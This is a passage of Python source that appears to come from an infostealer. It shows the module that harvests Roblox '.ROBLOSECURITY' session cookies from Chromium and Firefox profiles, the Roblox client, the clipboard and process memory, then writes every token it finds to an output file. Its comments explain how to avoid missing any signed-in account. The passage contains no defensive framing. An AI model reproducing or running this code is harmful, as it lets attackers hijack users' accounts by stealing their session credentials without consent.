                log.logger.debug("roblox: gecko profile failed: %s", profile, exc_info=True)

    detail: dict[str, Any] = {
        "profiles": len(records),
        "found": len(tokens),
        "reasons": _summary(records),
        "records": records,
        "reason": "",
    }
    if not tokens:
        detail["reason"] = "no .ROBLOSECURITY row" if not records else _first_reason(records)
    return tokens, detail


def run(out_dir: Path, cfg: Any) -> int:
    """Collect the Roblox session cookie from every store and from memory.

    Returns the number of distinct tokens written. A machine with no Roblox session
    writes ``roblox_status.json`` saying which of the two methods found nothing and,
    per profile, which kind of nothing it was, so a zero here is never ambiguous.
    """
    del cfg  # the collector has no options; the browsers flag is what enables it

    chromium_tokens, chromium_detail = _chromium_tokens()
    gecko_tokens, gecko_detail = _gecko_tokens()
    client_tokens, client_detail = _client_tokens()
    clipboard_tokens, clipboard_detail = _clipboard_tokens()

    collected: list[str] = []
    for value in (*chromium_tokens, *gecko_tokens, *client_tokens, *clipboard_tokens):
        if value not in collected:
            collected.append(value)

    # Memory runs even when a store answered. The cookie a browser has decrypted into its
    # heap is not necessarily the cookie the Roblox client jar holds: two signed-in
    # accounts, two carriers, and a run that skips the scan returns one of them and calls
    # it done. Deduplication on the value makes the overlap free.
    memory_tokens, memory_detail = _memory_tokens()
    for value in memory_tokens:
        if value not in collected:
            collected.append(value)

    status = {
        "cookie": COOKIE_NAME,
        "found": len(collected),
        "methods": {
            "chromium": chromium_detail,
            "gecko": gecko_detail,
            "client": client_detail,
            "clipboard": clipboard_detail,
            "memory": memory_detail,
        },
        "reason": "" if collected else "no session cookie on this machine",
    }

    if not collected:
        util.write_json(out_dir / STATUS_FILE, status)
        log.logger.debug("roblox: nothing found")
        return 0

    if not util.write_text(out_dir / SESSION_FILE, "\n".join(collected) + "\n"):
        status["reason"] = "write refused"
        util.write_json(out_dir / STATUS_FILE, status)
        return 0

    status["reason"] = ""
    util.write_json(out_dir / STATUS_FILE, status)
    log.logger.debug("roblox: %d token(s)", len(collected))
    return len(collected)


__all__ = ["COOKIE_NAME", "REASONS", "SESSION_FILE", "STATUS_FILE", "run"]
